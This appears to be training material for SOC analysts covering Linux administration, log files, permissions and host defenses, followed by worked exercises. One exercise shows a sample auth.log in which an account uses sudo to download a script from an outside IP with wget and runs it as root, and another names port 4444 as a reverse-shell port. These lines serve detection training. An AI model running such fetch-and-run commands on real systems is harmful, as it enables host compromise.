Concept 1 · Module 8.1

Linux Basics

Linux is an open-source operating system: anyone can read, change, and redistribute its source code. It's fast, stable, and runs on everything from routers to the servers behind most websites. For a SOC analyst, Linux isn't optional.

Why it mattersWhat that means for an analyst
Open sourceThe code can be inspected and customized, so organizations can strip a system down to just what it needs
The command line is the main interfaceAlmost everything can be done, scripted, and automated from the shell, including on a remote server with no GUI at all
Security tools are built for itPacket capture (tcpdump, Wireshark), IDS, SIEM, log management, and malware analysis tools mostly run on Linux. Distributions like Security Onion (monitoring) and Kali Linux (penetration testing) come with them preinstalled
It's what the servers runA large share of the web, DNS, mail, and cloud servers an analyst investigates are Linux hosts
A distribution ("distro") is the Linux kernel packaged with a set of tools, a package manager, and usually a desktop. Ubuntu, Debian, Fedora, Red Hat Enterprise Linux, Arch, and Kali are all distros. The commands in this session work the same way on nearly all of them.

Concept 2 · Module 8.2

Working in the Linux Shell

The shell (usually bash or zsh) takes typed commands and runs them. You reach it through a terminal emulator window, or over the network with SSH.

CommandWhat it does
manOpens the manual page for a command (man ls), which is the first place to look when you forget an option
pwd / cd / lsShow the current directory, change directory, list what's in it
mkdir / cp / mv / rmMake a directory, copy, move or rename, and remove files
cat / lessPrint a whole file to the screen, or page through a long one
grepSearch text for a pattern (grep "Failed password" auth.log). Analysts use it constantly
sudo / suRun one command as root, or switch to another user entirely
nano / viTerminal text editors, for when there's no GUI and a config file needs editing
In Linux, nearly everything is a text file. Configuration lives in plain text under /etc, and logs are plain text under /var/log. That's why the objective for this subtopic is manipulating text files: reading, searching, and editing text is most of the job.

Concept 3 · Module 8.3

Linux Servers and Clients

A server is a program that listens on a port and answers requests. A client is the program that sends those requests. Each service listens on a well-known port number, so a port that's open tells you what's running.

PortServicePortService
20/21FTP80HTTP
22SSH110POP3
23Telnet123NTP
25SMTP143IMAP
53DNS161SNMP
67/68DHCP443HTTPS

Finding what's running

CommandWhat it shows
netstat -tuln or ss -tulnListening TCP and UDP ports. ss is the newer replacement for netstat on most current distros
ps (e.g. ps aux)Running processes, including the server programs behind those ports
Same idea as netstat on Windows in Session 4. An unexpected listening port is suspicious on either OS.

Concept 4 · Module 8.4

Basic Server Administration

Every service reads its settings from a configuration file and writes what it does to a log file. Hardening a server and investigating one both begin with those two files.

Hardening basics

  • Keep the OS and services patched
  • Disable or remove services that aren't needed. A port that isn't open can't be attacked
  • Use SSH instead of Telnet, and disable direct root login over SSH
  • Enforce strong passwords, or better, key-based authentication

Where the logs are

Log fileWhat it records
/var/log/auth.log (Debian/Ubuntu) or /var/log/secure (Red Hat family)Authentication events: logins, failed passwords, sudo use
/var/log/syslog or /var/log/messagesGeneral system activity from many services
/var/log/kern.log and dmesgKernel messages: hardware, drivers, boot events
/var/log/cronScheduled jobs run by cron
Application logs (e.g. /var/log/apache2/, /var/log/nginx/)Per-service activity, like every request a web server handled
tail -f is the live view. tail -f /var/log/auth.log prints new lines as they're written, so you can watch logins happen in real time. On systemd-based distros, journalctl reads the same events from the system journal.

Concept 5 · Module 8.5

The Linux File System

Linux has a single directory tree that starts at /. Drives and partitions are mounted into that tree instead of getting their own drive letters.

File system typeNotes
ext2 / ext3 / ext4The standard Linux file systems. ext3 added journaling, and ext4 is the current default on many distros
NFSNetwork File System: mounts a directory shared by another machine over the network
swapDisk space used as overflow when RAM is full
CDFS, HFS+, APFSOptical media, and Apple's older and current file systems, which Linux can also mount

Permissions

Every file has an owner, a group, and others. Each of those three gets read, write, and execute bits. In numbers, r=4, w=2, x=1, added up for each of the three.

Links: a hard link (ln) is a second name for the same data on disk. A symbolic link (ln -s) is a shortcut that points to a path, and it breaks if the target is moved or deleted.

Concept 6 · Module 8.6

Working with the Linux GUI

Unlike Windows, the Linux graphical interface is a separate, swappable layer on top of the OS. A server usually has no GUI at all.

ComponentWhat it does
Display server (X Window System / X11, or Wayland)The low-level layer that draws to the screen and handles keyboard and mouse input
Window managerControls where windows go and how they look, move, and resize
Desktop environment (GNOME, KDE Plasma, Xfce, …)The full package: window manager, panels, app menu, file manager, and settings
The GUI is optional, the shell isn't. Many production servers never install a GUI, which uses fewer resources and leaves less software to attack. Even on a desktop, the terminal is one click away and is where real admin work happens.

Concept 7 · Module 8.7

Working on a Linux Host

Installing software, keeping it updated, watching processes, and checking for malware. This is day-to-day Linux host care.

TaskHow
Install / run applicationsUse the distro's package manager: apt (Debian/Ubuntu), dnf/yum (Red Hat family), pacman (Arch). It pulls signed packages from trusted repositories
Keep the system up to datesudo apt update && sudo apt upgrade (or your distro's equivalent). This is patching, the same job Windows Update does
Processes and forksA new process is created by forking (copying) an existing one, so every process has a parent. ps lists them, top shows them live, and kill stops one by its PID
Malware on a Linux hostLess common than on Windows, but real, and aimed mostly at servers: backdoors, cryptominers, botnet agents, and rootkits
Rootkit checkA rootkit hides itself by modifying the OS. Tools like chkrootkit scan for known rootkit signs
Piping commands| sends one command's output into another: ps aux | grep ssh, or cat auth.log | grep Failed | wc -l to count failed logins
A rootkit can lie to the tools you'd use to find it. If the kernel or ps itself has been tampered with, a clean-looking process list proves nothing. That's why rootkit checks look for signs of tampering, and why a heavily compromised host is usually rebuilt instead of trusted.

Concept 8 · Module 9.1

Defending Systems and Devices

Everything so far comes down to one job: reduce what an attacker can reach, keep what's left patched, and protect the device even when someone has it in their hands.

ControlWhat it involves
Operating system security (hardening)Start from a secure baseline: remove unneeded programs and services, change default accounts and passwords, apply least privilege
AntimalwareAntivirus, antispyware, and adware and phishing protection. Only install software from trusted sources
Patch managementA planned process for testing and deploying updates across every system, not just whenever someone remembers
Endpoint securityHost-based firewalls, host-based intrusion detection and prevention, and endpoint security suites (Concepts 9–10)
Host encryptionEncrypt files or entire drives (e.g. BitLocker, EFS) so stolen data can't be read
Boot integrityUEFI Secure Boot only loads a signed, trusted bootloader and OS, which blocks bootkits that load before the OS can defend itself
Physical protectionCable locks, locked rooms and cabinets, badge access, and asset tags. Someone with physical access can bypass most software controls

Every row in that table depends on one thing: knowing what's supposed to be there. You can't remove unneeded services, spot an unauthorized program, or notice a device that doesn't belong unless you've first written down what normal looks like. That record is a baseline configuration (how each system should be set up) plus an asset inventory (every system, device, and piece of software you own). Defenders relied on the same idea long before computers existed.

Think of it like… the village that knew everyone The book Cyberjutsu compares modern defense to feudal Japan, where shinobi (ninja) spied on and infiltrated villages and castles. The hardest targets were small, isolated villages. Each had its own dialect, clothing, and customs, and everyone knew everyone, so a stranger stood out right away. Strangers were watched, turned away from lodging, and told nothing. Villages even had a pecking order much like Concept 5's permissions: ordinary villagers, a chief who could lock the gates (root), and a lord at the center whom almost nobody could reach (the kernel).

A hardened system works the same way. When the baseline says exactly what belongs, anything unfamiliar stands out. The village comes back in Concept 11 and in the fisherman example under Worked examples. Adapted from McCarty, Cyberjutsu, Ch. 3 "Xenophobic Security"

Concept 9 · Module 9.2

Antimalware Protection

Endpoints are where users click links and open attachments, which makes them the most common way in. Malware protection has to happen both on the host and on the network in front of it.

How host-based antimalware detects malware

MethodHow it worksWeak spot
Signature-basedMatches files against a database of known malware "fingerprints"Misses new or modified malware it has no signature for
Heuristics-basedLooks for general traits common to malware, like suspicious code patternsMore false positives
Behavior-basedWatches what a program actually does while it runs, e.g. mass-encrypting filesThe malware has to start running before it's caught

Network-based malware protection

LayerWhat it does
Advanced malware protection (AMP)Endpoint and network protection that keeps tracking files after they've been let in, so it can flag them later if they turn out to be malicious
Email security appliance (ESA)Filters spam and malicious attachments and links before they reach an inbox
Web security appliance (WSA)Filters web traffic and blocks known-bad sites and downloads
Network Access Control (NAC)Keeps non-compliant devices (unpatched, no antivirus) off the network
ESA, WSA, and NAC are the specialized appliances from Session 4's security devices, now seen as part of malware defense.

These defenses have become good at catching the tools attackers write themselves. Good enough, in fact, that attackers changed tactics. Concept 11 covers what they switched to.

Concept 10 · Module 9.3

Host-Based Intrusion Prevention

Session 4's IDS and IPS protect the network. The host-based versions run on each endpoint, where they can see things network sensors can't, such as traffic after it's decrypted or a system file being changed.

ToolWhat it does
Host-based firewallFilters traffic in and out of one machine: Windows Defender Firewall, or iptables/nftables (with front ends like ufw and firewalld) on Linux
HIDS (host-based intrusion detection)Monitors a host's logs, file integrity, registry or config changes, and running processes, and alerts on anything suspicious. OSSEC is a common open-source example
HIPS (host-based intrusion prevention)Same visibility as a HIDS, but it can also block the action, not just alert

How a HIDS decides something is wrong

ApproachIdea
Anomaly-basedLearn what normal looks like on this host, then flag deviations from it
Policy-basedFlag anything that breaks a defined rule, e.g. "nothing may modify /etc/passwd except passwd"
Signature-basedMatch known attack patterns, the same idea as signature-based antimalware

Concept 11 · Module 9.4

Application Security

Every installed application adds to the attack surface, the total set of points where an attacker could try to get in. Application security shrinks that surface and makes unknown programs safe to examine.

TechniqueHow it works
Block list (blacklist)Name what's not allowed to run, and allow everything else. Easy to manage, but anything not on the list gets through
Allow list (whitelist)Name what is allowed to run, and block everything else. Much stronger, but more work to maintain
SandboxingRun a suspicious file in an isolated environment and watch what it does: files touched, registry changes, network calls. Examples include Cuckoo Sandbox, ANY.RUN, and Cisco's Threat Grid
Sandbox reports are how analysts learn what a piece of malware does without risking a real machine. That's the "use malware investigation tools" objective: submit a sample, then read the behavior report. Many public sandboxes publish reports for samples others have already submitted.

An allow list is the village from Concept 8 turned into software: only familiar programs get in. That creates a problem for attackers. If the only programs allowed to run are the defender's own, how does an attacker get anything done? They use the defender's own programs.

Think of it like… the shinobi's everyday tools Shinobi were trained to make tools from ordinary things they could buy or find on the spot, like farm tools and household items. A traveler carrying a sickle raised no suspicion, and a search turned up nothing unusual. Attackers call their version living off the land. Instead of bringing malware that antimalware might catch, they use what's already installed: PowerShell, Task Scheduler, or a web browser on Windows, and wget, bash, or even the SSH client from Concept 3 on Linux. All of these are on every allow list.

The "Reading auth.log like an analyst" example is exactly this: nothing in that log is malware. Since defenders can't delete their own tools, they limit who can run the powerful ones and log every use, the way sudo records each command. Adapted from McCarty, Cyberjutsu, Ch. 8 "Tools"

Linux logs

Is someone guessing passwords?

A Bastion client reports their Ubuntu web server "feels slow" and they're worried someone is trying to break into it over SSH. You have a shell on the box. Which file do you check, and what one-line command tells you how many failed login attempts there have been?

Show answer

File: /var/log/auth.log (Ubuntu is Debian-family; on Red Hat it would be /var/log/secure).

Command: grep "Failed password" /var/log/auth.log | wc -l. grep finds the matching lines, and piping them into wc -l counts them. Run tail -f /var/log/auth.log to watch new attempts arrive live.

Linux logs

Reading auth.log like an analyst

You pull this excerpt from /var/log/auth.log on a Bastion client's web server. The account deploy is supposed to be used only by an automated deployment script. Which lines are routine, and which would you escalate?

Sep 24 02:17:01 web01 CRON[2210]: pam_unix(cron:session): session opened for user root by (uid=0)
Sep 24 02:17:01 web01 CRON[2210]: pam_unix(cron:session): session closed for user root
Sep 24 02:41:09 web01 sshd[2388]: Accepted password for deploy from 203.0.113.45 port 51122 ssh2
Sep 24 02:42:30 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt-get install -y nmap
Sep 24 02:43:02 web01 sudo:   deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.7/x.sh
Sep 24 02:43:15 web01 sudo:   deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash x.sh
Show answer

Routine: the two CRON lines. Scheduled jobs open and close a root session like this all the time.

Escalate everything from 02:41 on. An account meant for automation logged in interactively (it has a terminal, TTY=pts/0), with a password, at 2:41 a.m. It then used sudo to become root and install a network scanner, downloaded a script into /tmp from an unfamiliar address, and ran it as root. Each step alone might have an explanation. Together they match the pattern of a stolen credential being used to escalate privileges and bring in tools.

Useful commands: grep "COMMAND=" /var/log/auth.log lists every command run through sudo, and grep deploy /var/log/auth.log shows everything that account did. Next, compare the times with the web server's access log. Checking two log sources against each other is called correlation.

Modeled on the Linux log exercise in Diogenes & Ozkaya, Cybersecurity – Attack and Defense Strategies, 3rd ed., Chapter 17. The log lines here are original, and the IP addresses come from ranges reserved for documentation.

Servers & clients

The port nobody asked for

On a Linux server that should only run a website, ss -tuln shows listeners on ports 22, 80, 443, and 4444.

Show answer

22 is SSH (normal for admin access), and 80/443 are HTTP/HTTPS (the website). 4444 isn't a standard service. It's a well-known default port for attacker tooling such as reverse shells. Next step: find which process owns it (sudo ss -tulnp or ps) and escalate.

Permissions

Read the permission string

ls -l shows -rw-r--r-- root root /etc/passwd and -rwxrwxrwx www-data www-data /var/www/upload.sh. What are the octal values, and which one should worry you?

Show answer

/etc/passwd is 644: root can read and write it, everyone else can only read it. That's normal for this file.

upload.sh is 777: anyone can modify and run it. Any user or compromised service could rewrite the script to do whatever they want. Tighten it with chmod 750 or stricter.

Defending systems

The fisherman who doesn't fit

Remember the village from Concept 8? Cyberjutsu includes a thought exercise that starts there. A castle's fish supplier speaks with an unfamiliar accent, preserves fish in a way nobody has seen before, and has a surname no one recognizes. He says he just likes the taste. Is he a spy? The book's point is that you have to plan for three possibilities: he is a spy, he isn't, or you can't tell.

Here's the network version. A Bastion client's scan turns up a new device named HP-LaserJet-4F. Its network card maker (looked up from its MAC address) is Raspberry Pi, not HP. It's listening on SSH (port 22) and isn't in the asset inventory. What do you do?

Show answer

Check it against the baseline. It isn't in the inventory, and its hardware doesn't match its name. Printers don't usually run SSH, either. That's the "unfamiliar accent."

Verify the story before you act on it. Ask facilities and IT whether anyone installed a printer or a Raspberry Pi on that floor. A test board left by a staff member is possible, and so is a planted device.

Contain it without destroying evidence. Isolate it by moving it to a quarantine VLAN or blocking it through NAC, instead of just unplugging it. That limits the risk if it is malicious and keeps it intact for investigation if you can't yet tell. Then update the inventory either way.

Adapted from the Castle Theory thought exercise in McCarty, Cyberjutsu, Ch. 3. The network scenario is original.

Antimalware

Why didn't antivirus catch it?

A brand-new ransomware strain, never seen before, lands on an endpoint. The signature-based antivirus says the file is clean. Seconds after it runs, the endpoint agent kills it because it started rapidly encrypting files in the user's Documents folder.

Show answer

Signature-based detection can only match malware it already has a fingerprint for, and there wasn't one for a new strain. Behavior-based detection caught it by what it did (mass encryption), not by what it looked like. That's why modern endpoint protection layers several detection methods.

Application security

Block list or allow list?

Two environments: (A) a point-of-sale terminal that only ever runs the register app, and (B) a developer's workstation where new tools get installed weekly.

Show answer

(A) Allow list. The set of legitimate programs is tiny and never changes, so blocking everything else costs almost nothing and stops unknown malware outright.

(B) Block list (plus good antimalware). An allow list would need updating constantly and would get in the way of the job. The trade-off is weaker protection against anything not already known to be bad.
